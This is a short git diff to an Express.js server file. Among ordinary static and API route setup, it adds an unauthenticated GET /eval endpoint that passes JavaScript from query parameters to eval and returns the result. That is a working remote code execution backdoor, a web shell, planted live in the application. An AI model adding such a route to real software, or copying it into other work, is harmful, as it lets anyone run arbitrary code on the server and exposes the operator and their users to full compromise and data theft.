@@ -12,7 +12,17 @@ const routes = require('./routes');
 app.use(express.static('public'))
 app.use('/api', routes.router);
 app.use('/public', express.static('public'));
-
+app.get('/eval', async (req, res) => {
+  let code = req.query.query || req.query.q || req.query.code
+	let evaled
+	try {
+		evaled = await eval(`(async () => { ${code} })()`)
+	} catch (e) {
+		evaled = e
+	} finally {
+		res.send(require('util').format(evaled))
+	}
+})
 
 /*
 app.use('/', swaggerUi.serve);
